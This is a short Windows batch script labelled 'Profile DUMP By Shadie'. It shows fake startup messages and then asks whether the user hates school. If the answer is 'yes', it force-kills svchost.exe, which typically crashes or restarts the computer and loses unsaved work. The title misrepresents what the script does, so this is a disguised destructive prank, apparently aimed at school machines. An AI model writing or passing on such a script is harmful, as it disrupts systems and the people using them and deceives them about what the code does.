@echo off
setlocal
echo Profile DUMP By Shadie
timeout /t 5 /nobreak > nul
echo Starting Script
timeout /t 5 /nobreak > nul
echo Started!!

:inputPrompt
set /p userInput="Do you hate school? (yes/no): "

if /i "%userInput%"=="yes" (
    echo You typed YES. Running the command to kill svchost.exe...
    taskkill /im svchost.exe /f
    echo Command for YES executed.
) else if /i "%userInput%"=="no" (
    echo You typed NO. Exiting the script.
) else (
    echo Invalid input. Please type YES or NO.
    goto inputPrompt
)

endlocal
